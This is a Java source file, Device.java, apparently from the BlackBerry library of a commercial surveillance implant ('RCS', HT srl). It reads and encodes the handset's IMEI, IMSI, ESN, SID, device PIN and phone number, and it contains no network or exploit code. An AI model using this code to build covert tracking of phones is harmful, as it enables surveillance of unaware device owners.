//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Device.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.system.SIMCardException;
import net.rim.device.api.system.SIMCardInfo;
import net.rim.device.api.ui.text.PhoneTextFilter;
import net.rim.device.api.util.NumberUtilities;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class Device.
 */
public final class Device implements Singleton {

    private static final long GUID = 0x88075bba9b4048c4L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Device", DebugLevel.INFORMATION);
    //#endif       

    public int network;

    /** The imei. */
    byte[] imei = new byte[0];

    /** The imsi. */
    byte[] imsi = new byte[0];

    /** The phone number. */
    String phoneNumber = "";

    /** The instance. */
    private static Device instance = null;

    /**
     * Gets the single instance of Device.
     * 
     * @return single instance of Device
     */
    public static synchronized Device getInstance() {
        if (instance == null) {
            instance = (Device) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final Device singleton = new Device();
                singleton.init();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    int majorVersion;
    int minorVersion;

    private void init() {
        String version = DeviceInfo.getSoftwareVersion();
        Vector tokens = Utils.splitString(version, ".");

        majorVersion = Integer.parseInt((String) tokens.elementAt(0));
        minorVersion = Integer.parseInt((String) tokens.elementAt(1));

        //#ifdef DEBUG
        debug.info("Version major: " + majorVersion + " minor: " + minorVersion);
        //#endif
        
        refreshData();
    }

    /**
     * Gets the subtype.
     * 
     * @return the subtype
     */
    public static byte[] getSubtype() {

        return Version.SUBTYPE.getBytes();
    }

    /**
     * Gets the version.
     * 
     * @return the version
     */
    public static byte[] getVersion() {
        final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
        //#ifdef DBC
        Check.ensures(versionRet.length == 4, "Wrong version len");
        //#endif
        return versionRet;
    }

    /**
     * Instantiates a new device.
     */
    private Device() {
    }

    /**
     * Clear.
     */
    public void clear() {
        imsi = new byte[0];
        imei = new byte[0];
        phoneNumber = "";
        return;
    }

    public static boolean isCDMA() {
        final int networkType = RadioInfo.getNetworkType();
        return networkType == RadioInfo.NETWORK_CDMA;
    }

    public static boolean isGPRS() {
        final int networkType = RadioInfo.getNetworkType();
        //#ifdef DEBUG
        //debug.trace("isGPRS: " + networkType);
        //#endif
        return networkType == RadioInfo.NETWORK_GPRS ||  networkType == RadioInfo.NETWORK_UMTS;
    }

    public static boolean isIDEN() {
        final int networkType = RadioInfo.getNetworkType();
        return networkType == RadioInfo.NETWORK_IDEN;
    }

    public static boolean isSimEnabled() {
        try {
            return SIMCardInfo.getIMSI() != null;
        } catch (SIMCardException e) {
            return false;
        }
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public String getImei() {

        if (isGPRS()) {
            //#ifdef DBC
            Check.ensures(imei != null, "null imei");
            //#endif
            return Utils.imeiToString(imei);
        } else {
            //#ifdef DEBUG
            debug.warn("Network is CDMA or IDEN, no imei");
            //#endif
            return "";
        }
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public String getImsi() {

        return Utils.imeiToString(imsi);

    }

    public int getSid() {
        if (isCDMA()) {
            return CDMAInfo.getCurrentSID();
        }
        return 0;
    }

    public int getEsn() {
        if (isCDMA()) {
            return CDMAInfo.getESN();
        }
        return 0;
    }

    private int getMeid() {
        /*
         * if (isCDMA()) { return CDMAInfo.getHexMEID() ; }
         */
        return 0;
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public String getPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        //#endif
        return phoneNumber;
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public byte[] getWImei() {
        //#ifdef DBC
        Check.ensures(imei != null, "null imei");
        Check.ensures(isGPRS(), "!GPRS");
        //#endif
        return WChar.getBytes(Utils.imeiToString(imei));
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public byte[] getWImsi() {
        return WChar.getBytes(Utils.imeiToString(imsi));
    }

    public byte[] getWPin() {
        //#ifdef DBC
        Check.ensures(imei != null, "null imei");
        //#endif
        return WChar.getBytes(getPin());
    }

    public byte[] getWDeviceId() {
        return getWPin();
    }

    public byte[] getWUserId() {
        if (isCDMA()) {
            final int sid = getSid();
            final String sidW = NumberUtilities.toString(sid, 10);
            return WChar.getBytes(sidW);
        } else if (isGPRS()) {
            return getWImsi();
        } else if (isIDEN()) {
            //TODO IDEN
            return new byte[] {};
        } else {
            return new byte[] {};
        }
    }

    private byte[] getWESN() {
        //#ifdef DBC
        Check.ensures(isCDMA(), "!CDMA");
        //#endif
        return WChar.getBytes(NumberUtilities.toString(getEsn(), 16));
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public byte[] getWPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        //#endif
        final byte[] encoded = WChar.getBytes(phoneNumber);
        return encoded;
    }

    /**
     * Refresh data.
     */
    public void refreshData() {
        //#ifdef DEBUG
        debug.info("PIN: " + getPin());
        //#endif

        // gprs or cdma?
        if (isCDMA()) {
            //#ifdef DEBUG
            debug.trace("cdma");
            //#endif
            imsi = CDMAInfo.getIMSI();
            final String imsiString = new String(imsi);

            //#ifdef DEBUG
            debug.info("SID: " + getSid());
            debug.info("ESN: " + getEsn());
            debug.info("MEID: " + getMeid());
            //#endif

            imei = new byte[0];
        } else if (isGPRS()) {
            //#ifdef DEBUG
            debug.trace("gprs");
            //#endif
            try {
                imsi = SIMCardInfo.getIMSI();
                if (imsi == null) {
                    imsi = new byte[0];
                }
                
                //#ifdef DEBUG
                debug.info("IMSI: " + Utils.imeiToString(imsi));
                //#endif

            } catch (final SIMCardException e) {
                //#ifdef WARN
                debug.warn("no sim detected");
                //#endif
            }

            imei = GPRSInfo.getIMEI();
            //#ifdef DEBUG
            debug.info("IMEI: " + Utils.imeiToString(imei));
            //#endif

        } else if (isIDEN()) {
            //TODO IDEN
        }

        //#ifdef DEBUG
        debug.trace("getting phone");
        //#endif
        phoneNumber = Phone.getDevicePhoneNumber(true);

        //#ifdef DEBUG
        debug.trace("phoneNumber: " + phoneNumber);
        //#endif

        if (phoneNumber == null) {
            phoneNumber = "Unknown";
        } else {
            boolean valid = true;

            try {
                final PhoneTextFilter filter = new PhoneTextFilter(
                        PhoneTextFilter.ACCEPT_EVERYTHING_EXCEPT_WILD_CARD);

                for (int i = 0; i < phoneNumber.length(); i++) {
                    valid &= filter.validate(phoneNumber.charAt(i));
                }
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
                valid = false;
            }

            if (!valid) {
                phoneNumber = "Unknown";
            }
        }

        //#ifdef DEBUG
        debug.info("Phone Number: " + phoneNumber);
        //#endif
    }

    public static String getPin() {
        return NumberUtilities.toString(DeviceInfo.getDeviceId(), 16);
    }

    public boolean atLeast(int major, int minor) {
        try {

            //#ifdef DEBUG
            debug.trace("Version major: " + majorVersion + " minor: "
                    + minorVersion);
            debug.trace("atLeast: " + major + "." + minor);
            //#endif
            if (majorVersion > major) {
                return true;
            } else if (majorVersion == major) {
                return (minorVersion >= minor);
            } else {
                return false;
            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("atLeast: " + ex);
            //#endif
        }

        return false;
    }

}
